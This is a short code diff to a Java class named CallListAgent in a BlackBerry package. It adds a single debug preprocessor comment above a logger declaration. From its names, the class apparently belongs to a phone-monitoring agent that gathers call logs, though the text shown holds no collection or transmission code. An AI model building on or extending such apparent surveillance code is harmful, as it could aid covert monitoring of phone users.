@@ -11,6 +11,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class CallListAgent extends Agent {
+	//#debug
     private static Debug debug = new Debug("CallListAgent", DebugLevel.VERBOSE);
 
     public CallListAgent(boolean agentStatus) {
